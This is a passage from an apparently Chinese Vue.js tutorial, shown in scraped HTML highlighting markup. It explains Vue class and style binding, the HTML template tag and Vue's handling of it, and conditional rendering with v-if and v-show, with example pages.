class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>绑定样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.basic</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">width</span>: <span class="number">400px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.happy</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">border</span>: <span class="number">4px</span> solid red;;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0.644</span>);</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">30deg</span>,yellow,pink,orange,yellow);</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.sad</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">border</span>: <span class="number">4px</span> dashed <span class="built_in">rgb</span>(<span class="number">2</span>, <span class="number">197</span>, <span class="number">2</span>);</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: gray;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.normal</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: skyblue;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.atguigu1</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: yellowgreen;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.atguigu2</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">text-shadow</span>:<span class="number">2px</span> <span class="number">2px</span> <span class="number">10px</span> red;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.atguigu3</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">border-radius</span>: <span class="number">20px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">绑定样式：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1. class样式</span></span></span><br><span class="line"><span class="comment"><span class="xml">写法:class=&quot;xxx&quot; xxx可以是字符串、对象、数组。</span></span></span><br><span class="line"><span class="comment"><span class="xml">字符串写法适用于：类名不确定，要动态获取。</span></span></span><br><span class="line"><span class="comment"><span class="xml">对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。</span></span></span><br><span class="line"><span class="comment"><span class="xml">数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。</span></span></span><br><span class="line"><span class="comment"><span class="xml">2. style样式</span></span></span><br><span class="line"><span class="comment"><span class="xml">:style=&quot;&#123;fontSize: xxx&#125;&quot;其中xxx是动态值。</span></span></span><br><span class="line"><span class="comment"><span class="xml">:style=&quot;[a,b]&quot;其中a、b是样式对象。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;mood&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 绑定style样式--对象写法 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 绑定style样式--数组写法 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">mood</span>:<span class="string">&#x27;normal&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">classArr</span>:[<span class="string">&#x27;atguigu1&#x27;</span>,<span class="string">&#x27;atguigu2&#x27;</span>,<span class="string">&#x27;atguigu3&#x27;</span>],</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">classObj</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">atguigu1</span>:<span class="literal">false</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">atguigu2</span>:<span class="literal">false</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">styleObj</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">color</span>:<span class="string">&#x27;red&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">styleObj2</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">backgroundColor</span>:<span class="string">&#x27;orange&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">styleArr</span>:[</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">color</span>:<span class="string">&#x27;blue&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">backgroundColor</span>:<span class="string">&#x27;gray&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">changeMood</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> arr = [<span class="string">&#x27;happy&#x27;</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="string">&#x27;normal&#x27;</span>]</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">3</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.mood = arr[index]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h2><h3 id="html中的template"><a href="#html中的template" class="headerlink" title="html中的template"></a>html中的template</h3><p>html中的<code>template</code>标签中的内容在页面中不会显示。但是在后台查看页面DOM结构存在<code>template</code>标签。这是因为template标签天生不可见，它设置了<code>display:none;</code>属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--当前页面只显示<span class="string">&quot;我是自定义表现abc&quot;</span>这个内容，不显示<span class="string">&quot;我是template&quot;</span>,这是因为template标签天生不可见--&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">abc</span>&gt;</span>我是自定义表现abc<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>template标签操作的属性和方法<br>content属性:在js中template标签对应的dom对象存在content属性，对应的属性值是一个dom节点，节点的nodeName是#document-fragment。通过该属性可以获取template标签中的内容，template对象.content可以调用getElementById、querySelector、querySelectorAll方法来获取里面的子节点。<br>innerHTML:可以获取template标签中的html。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template id=<span class="string">&quot;tem&quot;</span>&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">let</span> o = <span class="built_in">document</span>.getElementById(<span class="string">&quot;tem&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">console</span>.log(o.content.nodeName);<span class="comment">//#document-fragment</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">console</span>.log(o.content.querySelectorAll(<span class="string">&quot;div&quot;</span>));<span class="comment">//NodeList(2) [div#div1, div]。得到一个类数组</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">console</span>.log(o.content.getElementById(<span class="string">&quot;div1&quot;</span>));<span class="comment">//&lt;div id=&quot;div1&quot;&gt;我是template&lt;/div&gt;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">console</span>.log(o.innerHTML);<span class="comment">//&#x27;&lt;div id=&quot;div1&quot;&gt;我是template&lt;/div&gt;&lt;div&gt;我是template&lt;/div&gt;&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Vue中的template"><a href="#Vue中的template" class="headerlink" title="Vue中的template"></a>Vue中的template</h3><p>1、template标签在vue实例绑定的元素内部</p><blockquote><p>它是可以显示template标签中的内容，但是查看后台的dom结构不存在template标签。如果template标签不放在vue实例绑定的元素内部默认里面的内容不能显示在页面上，但是查看后台dom结构存在template标签。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    &lt;!--此处的template标签中的内容显示并且在dom中不存在template标签--&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!--此处的template标签中的内容在页面中不显示，但是在dom结构存在该标签及内部结构--&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;tem&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;node_modules/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：</strong> <strong>vue实例绑定的元素内部的template标签不支持v-show指令</strong>，即v-show=”false”对template标签来说不起作用。但是此时的template标签支持v-if、v-else-if、v-else、v-for这些指令。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>条件渲染<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">条件渲染：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.v-if</span></span></span><br><span class="line"><span class="comment"><span class="xml">写法：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).v-if=&quot;表达式&quot; </span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).v-else-if=&quot;表达式&quot;</span></span></span><br><span class="line"><span class="comment"><span class="xml">(3).v-else=&quot;表达式&quot;</span></span></span><br><span class="line"><span class="comment"><span class="xml">适用于：切换频率较低的场景。</span></span></span><br><span class="line"><span class="comment"><span class="xml">特点：不展示的DOM元素直接被移除。</span></span></span><br><span class="line"><span class="comment"><span class="xml">注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">2.v-show</span></span></span><br><span class="line"><span class="comment"><span class="xml">写法：v-show=&quot;表达式&quot;</span></span></span><br><span class="line"><span class="comment"><span class="xml">适用于：切换频率较高的场景。</span></span></span><br><span class="line"><span class="comment"><span class="xml">特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。</span></span></span><br><span class="line"><span class="comment"><span class="xml"> --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 使用v-show做条件渲染 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;h2 v-show=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;h2 v-show=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 使用v-if做条件渲染 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;h2 v-if=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;h2 v-if=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- v-else和v-else-if --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;div v-if=&quot;n === 1&quot;&gt;Angular&lt;/div&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">&lt;div v-else-if=&quot;n === 2&quot;&gt;React&lt;/div&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">&lt;div v-else-if=&quot;n === 3&quot;&gt;Vue&lt;/div&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">&lt;div v-else&gt;哈哈&lt;/div&gt; --&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- v-if与template的配合使用 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;n === 1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>尚硅谷<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">n</span>:<span class="number">0</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span 